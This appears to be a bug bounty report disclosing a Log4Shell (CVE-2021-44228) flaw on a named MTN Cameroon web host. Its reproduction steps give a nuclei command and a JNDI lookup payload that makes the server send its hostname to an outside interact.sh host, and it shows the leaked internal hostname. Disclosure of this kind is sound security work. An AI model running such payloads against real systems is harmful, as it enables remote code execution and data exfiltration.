  "content": "\nSummary\nHello,\nI would to like report this security flaw on http://mtn1app.mtncameroon.net . Using script nuclei i can found CVE-2021-44228. This is a critical issue cause as remote command execution. On my test i just retrive hostname of machine via nuclei script. (https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)\nSteps To Reproduce\nHow we can reproduce the issue;\nrun nuclei script via cmd; ./nuclei -u http://mtn1app.mtncameroon.net:8080/ -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml\nIt will retrive the hostname of machine on output \" lastic-co1-nodes1.mtnnigeria.net\"\nLike this;\nCode 148 Bytes\n1http://mtn1app.mtncameroon.net:8080/?x=${jndi:ldap://${hostName}.c6s11oscca8f9pc2lrggcghbnjyyyybjg.interact.sh/a} [lastic-co1-nodes1.mtnnigeria.net]\nThis vulnerability is on port 8080 and 8443;\nhttp://mtn1app.mtncameroon.net:8080\nhttps://mtn1app.mtncameroon.net:8443\nMitigation\nUpdate according the vendor and thecnical references..\nReferences\nhttps://www.tenable.com/blog/cve-2021-44228-proof-of-concept-for-critical-apache-log4j-remote-code-execution-vulnerability\nhttps://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476\nImpact\nRemote command execution\n\n",
